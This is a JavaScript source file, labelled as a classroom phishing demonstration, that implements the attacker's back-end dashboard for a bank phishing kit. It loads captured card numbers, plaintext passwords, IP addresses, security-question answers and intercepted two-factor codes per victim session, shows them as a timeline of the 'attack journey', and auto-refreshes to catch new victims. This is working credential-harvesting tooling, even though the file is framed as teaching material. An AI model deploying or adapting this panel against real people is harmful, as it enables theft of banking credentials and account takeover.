/*
 * Educational Phishing Demonstration
 * ----------------------------------------
 * Programme: AEC Cybersécurité : protection et défense
 * Author/Professor: Akram Nasr
 * Email: Akram.Nasr@cmontmorency.qc.ca
 *
 * IMPORTANT NOTICE:
 * This code is created for EDUCATIONAL PURPOSES ONLY to demonstrate
 * phishing techniques and security vulnerabilities as part of
 * cybersecurity education. Using this code for actual phishing
 * or any malicious purpose is illegal and unethical.
 */

// Question text mapping
const questionMap = {
  q1: "What was the name of your first pet?",
  q2: "In what city were you born?",
  q3: "What is your mother's maiden name?",
  q4: "What was the make of your first car?",
  q5: "What elementary school did you attend?",
  q6: "What is the name of your favorite childhood teacher?",
  q7: "What was your childhood nickname?",
  q8: "In what city did you meet your spouse/significant other?",
  q9: "What is the name of your favorite movie?",
  q10: "What is your favorite vacation destination?",
  q11: "What is the name of your first manager?",
  q12: "What was the street name you grew up on?",
  q13: "What is your oldest sibling's middle name?",
  q14: "What year did you graduate from high school?",
  q15: "What is the model of your first mobile phone?",
};

// Global variables to store the data
let cardsData = [];
let questionsData = [];
let twoFAData = [];

// Load data from JSON files
async function loadData() {
  try {
    // Reset arrays for fresh load
    cardsData = [];
    questionsData = [];
    twoFAData = [];

    // Optional: add cache busting to each URL if needed.
    const timestamp = new Date().getTime();

    // Fetch cards data
    try {
      const cardsResponse = await fetch(`../data/cards.json?t=${timestamp}`);
      if (cardsResponse.ok) {
        const text = await cardsResponse.text();
        if (text.trim()) {
          cardsData = JSON.parse(text);
        }
      }
    } catch (error) {
      console.log(
        "Cards data file may not exist yet or has invalid format:",
        error
      );
    }

    // Fetch questions data
    try {
      const questionsResponse = await fetch(
        `../data/questions.json?t=${timestamp}`
      );
      if (questionsResponse.ok) {
        const text = await questionsResponse.text();
        if (text.trim()) {
          questionsData = JSON.parse(text);
        }
      }
    } catch (error) {
      console.log(
        "Questions data file may not exist yet or has invalid format:",
        error
      );
    }

    // Fetch 2FA data
    try {
      const twoFAResponse = await fetch(
        `../data/2fa.json?t=${timestamp}`
      );
      if (twoFAResponse.ok) {
        const text = await twoFAResponse.text();
        if (text.trim()) {
          twoFAData = JSON.parse(text);
        }
      }
    } catch (error) {
      console.log(
        "2FA data file may not exist yet or has invalid format:",
        error
      );
    }

    // Display the data and update stats
    displayCards(cardsData);
    updateStats(cardsData, questionsData, twoFAData);
  } catch (error) {
    console.error("Error in loadData function:", error);
    document.getElementById("card-grid").innerHTML = `
      <div class="empty-message">
          <p>Error loading data. Please check the JSON files.</p>
          <p>Error details: ${error.message}</p>
      </div>
    `;
  }
}

// Display cards in the grid
function displayCards(cards) {
  const cardGrid = document.getElementById("card-grid");
  if (cards.length === 0) {
    cardGrid.innerHTML = `
      <div class="empty-message">
          <p>No card data available yet.</p>
      </div>
    `;
    return;
  }
  cardGrid.innerHTML = "";

  cards.forEach((card) => {
    const cardElement = document.createElement("div");
    cardElement.className = "card";

    // Format date for display
    const date = new Date(card.date);
    const formattedDate =
      date.toLocaleDateString() + " " + date.toLocaleTimeString();
    // Mask card number for display
    const maskedCardNumber = card.card_number.replace(/\d(?=\d{4})/g, "*");

    // Check if this session has security questions and/or 2FA codes
    const hasQuestions = questionsData.some(
      (q) => q.session_id === card.session_id
    );
    const has2FA = twoFAData.some((fa) => fa.session_id === card.session_id);

    // Create completion status badges
    let completionStatus = `<div class="completion-status">`;
    completionStatus += `<span class="badge ${
      hasQuestions ? "badge-success" : "badge-gray"
    }">Security Questions</span>`;
    completionStatus += `<span class="badge ${
      has2FA ? "badge-success" : "badge-gray"
    }">2FA Code</span>`;
    completionStatus += `</div>`;

    cardElement.innerHTML = `
      <div class="card-header">
          <div class="card-title">Card Information</div>
          <div class="card-date">${formattedDate}</div>
      </div>
      <div class="card-content">
          <div class="detail-row">
              <span class="detail-label">Card Number:</span>
              <span>${maskedCardNumber}</span>
          </div>
          <div class="detail-row">
              <span class="detail-label">Password:</span>
              <span>${card.password}</span>
          </div>
          <div class="detail-row">
              <span class="detail-label">IP Address:</span>
              <span>${card.ip}</span>
          </div>
          <div class="detail-row">
              <span class="detail-label">Session ID:</span>
              <span>${card.session_id}</span>
          </div>
          <div class="detail-row">
              <span class="detail-label">User Agent:</span>
              <span>${truncateText(card.user_agent, 40)}</span>
          </div>
          ${completionStatus}
      </div>
      <div class="card-actions">
          <button class="btn btn-primary" onclick="openQuestionsModal('${
            card.session_id
          }')">Security Questions</button>
          ${
            has2FA
              ? `<button class="btn btn-success" onclick="openUserJourneyModal('${card.session_id}')">View Complete Journey</button>`
              : ""
          }
      </div>
    `;

    cardGrid.appendChild(cardElement);
  });
}

// Update stats in the header
function updateStats(cards, questions, codes) {
  document.getElementById("total-cards").textContent = cards.length;
  document.getElementById("total-responses").textContent = questions.length;
  document.getElementById("total-2fa").textContent = codes.length;
}

// Open modal with security questions for a specific session
function openQuestionsModal(sessionId) {
  const modal = document.getElementById("questionsModal");
  const container = document.getElementById("questions-container");
  container.innerHTML =
    '<div class="loading-spinner"><div class="spinner"></div><p>Loading questions...</p></div>';
  // Show modal using inline style (or you could add a "show" class)
  modal.style.display = "flex";

  setTimeout(() => {
    const sessionQuestions = questionsData.filter(
      (q) => q.session_id === sessionId
    );
    if (sessionQuestions.length === 0) {
      container.innerHTML =
        "<p>No security questions found for this session.</p>";
    } else {
      container.innerHTML = "";
      sessionQuestions.forEach((entry) => {
        const questionDiv = document.createElement("div");
        questionDiv.className = "question-entry";
        const date = new Date(entry.date);
        const formattedDate =
          date.toLocaleDateString() + " " + date.toLocaleTimeString();
        questionDiv.innerHTML = `
          <div class="question-header">
              <span>Session: ${entry.session_id}</span>
              <span>Date: ${formattedDate}</span>
          </div>
          <div class="question-details">
              <div class="question-item">
                  <div class="question-label">Question 1:</div>
                  <div>${questionMap[entry.question1] || entry.question1}</div>
                  <div class="question-label">Answer:</div>
                  <div>${entry.answer1}</div>
              </div>
              <div class="question-item">
                  <div class="question-label">Question 2:</div>
                  <div>${questionMap[entry.question2] || entry.question2}</div>
                  <div class="question-label">Answer:</div>
                  <div>${entry.answer2}</div>
              </div>
              <div class="question-item">
                  <div class="question-label">Question 3:</div>
                  <div>${questionMap[entry.question3] || entry.question3}</div>
                  <div class="question-label">Answer:</div>
                  <div>${entry.answer3}</div>
              </div>
          </div>
        `;
        container.appendChild(questionDiv);
      });
    }
  }, 300); // Small delay for spinner effect
}

// Open modal with complete user journey
function openUserJourneyModal(sessionId) {
  const modal = document.getElementById("userJourneyModal");
  const container = document.getElementById("user-journey-container");
  container.innerHTML =
    '<div class="loading-spinner"><div class="spinner"></div><p>Loading complete journey data...</p></div>';
  modal.style.display = "flex";

  setTimeout(() => {
    const sessionCard = cardsData.find((c) => c.session_id === sessionId);
    const sessionQuestions = questionsData.find(
      (q) => q.session_id === sessionId
    );
    const session2FA = twoFAData.find((fa) => fa.session_id === sessionId);

    if (!sessionCard) {
      container.innerHTML = "<p>No data found for this session.</p>";
      return;
    }

    // Format and mask card info
    const cardDate = new Date(sessionCard.date);
    const maskedCardNumber = sessionCard.card_number.replace(
      /\d(?=\d{4})/g,
      "*"
    );

    let journeyHTML = `
      <div class="journey-timeline">
        <div class="journey-step">
          <div class="journey-content">
            <h3>Step 1: Card Information Captured</h3>
            <div class="journey-details">
              <div class="detail-row">
                <span class="detail-label">Card Number:</span>
                <span>${maskedCardNumber}</span>
              </div>
              <div class="detail-row">
                <span class="detail-label">Password:</span>
                <span>${sessionCard.password}</span>
              </div>
              <div class="detail-row">
                <span class="detail-label">IP Address:</span>
                <span>${sessionCard.ip}</span>
              </div>
            </div>
          </div>
        </div>
    `;

    if (sessionQuestions) {
      journeyHTML += `
        <div class="journey-step">
          <div class="journey-content">
            <h3>Step 2: Security Questions Captured</h3>
            <div class="journey-details">
              <div class="question-details journey-questions">
                <div class="question-item">
                  <div class="question-label">Question 1:</div>
                  <div>${
                    questionMap[sessionQuestions.question1] ||
                    sessionQuestions.question1
                  }</div>
                  <div class="question-label">Answer:</div>
                  <div>${sessionQuestions.answer1}</div>
                </div>
                <div class="question-item">
                  <div class="question-label">Question 2:</div>
                  <div>${
                    questionMap[sessionQuestions.question2] ||
                    sessionQuestions.question2
                  }</div>
                  <div class="question-label">Answer:</div>
                  <div>${sessionQuestions.answer2}</div>
                </div>
                <div class="question-item">
                  <div class="question-label">Question 3:</div>
                  <div>${
                    questionMap[sessionQuestions.question3] ||
                    sessionQuestions.question3
                  }</div>
                  <div class="question-label">Answer:</div>
                  <div>${sessionQuestions.answer3}</div>
                </div>
              </div>
            </div>
          </div>
        </div>
      `;
    }

    if (session2FA) {
      const faDate = new Date(session2FA.date);
      journeyHTML += `
        <div class="journey-step">
          <div class="journey-content">
            <h3>Step 3: Two-Factor Authentication Code Captured</h3>
            <div class="journey-details">
              <div class="detail-row highlight">
                <span class="detail-label">Verification Code:</span>
                <span class="code-highlight">${
                  session2FA.verification_code
                }</span>
              </div>
              <div class="detail-row">
                <span class="detail-label">Time Elapsed From Card Entry:</span>
                <span>${calculateTimeElapsed(cardDate, faDate)}</span>
              </div>
            </div>
          </div>
        </div>
      `;
    }

    journeyHTML += `</div>`;
    journeyHTML += `
      <div class="journey-summary">
        <h3>Attack Summary</h3>
        <div class="summary-content">
          <ul>
            <li>Initial credential capture (card number and password)</li>
            ${
              sessionQuestions
                ? "<li>Security question answers harvested</li>"
                : ""
            }
            ${
              session2FA
                ? "<li>Two-factor authentication code intercepted</li>"
                : ""
            }
          </ul>
          <p class="summary-note">With this information, an attacker would have enough credentials to completely bypass the bank's security measures and gain unauthorized access to the victim's account.</p>
        </div>
      </div>
    `;
    container.innerHTML = journeyHTML;
  }, 300);
}

// Calculate time elapsed between two dates
function calculateTimeElapsed(startDate, endDate) {
  const diffMs = endDate - startDate;
  const diffMins = Math.floor(diffMs / 60000);
  const diffSecs = Math.floor((diffMs % 60000) / 1000);
  return diffMins > 0
    ? `${diffMins} minutes, ${diffSecs} seconds`
    : `${diffSecs} seconds`;
}

// Utility function to truncate long text
function truncateText(text, maxLength) {
  return text.length <= maxLength ? text : text.substring(0, maxLength) + "...";
}

// Tab switching functionality
function setupTabs() {
  const tabButtons = document.querySelectorAll(".tab-button");
  tabButtons.forEach((button) => {
    button.addEventListener("click", () => {
      document
        .querySelectorAll(".tab-button")
        .forEach((btn) => btn.classList.remove("active"));
      document
        .querySelectorAll(".tab-content")
        .forEach((tab) => tab.classList.remove("active"));
      button.classList.add("active");
      const tabId = button.getAttribute("data-tab");
      document.getElementById(tabId).classList.add("active");
    });
  });
}

// Close modals
document.getElementsByClassName("close")[0].onclick = function () {
  document.getElementById("questionsModal").style.display = "none";
};

document.getElementsByClassName("journey-close")[0].onclick = function () {
  document.getElementById("userJourneyModal").style.display = "none";
};

// Close modal when clicking outside
window.onclick = function (event) {
  const questionsModal = document.getElementById("questionsModal");
  const journeyModal = document.getElementById("userJourneyModal");

  if (event.target == questionsModal) {
    questionsModal.style.display = "none";
  }
  if (event.target == journeyModal) {
    journeyModal.style.display = "none";
  }
};

// Auto-refresh data every 30 seconds
function setupAutoRefresh() {
  setInterval(loadData, 30000); // 30 seconds
}

// Load data when page loads
document.addEventListener("DOMContentLoaded", () => {
  loadData();
  setupTabs();
  setupAutoRefresh();
});
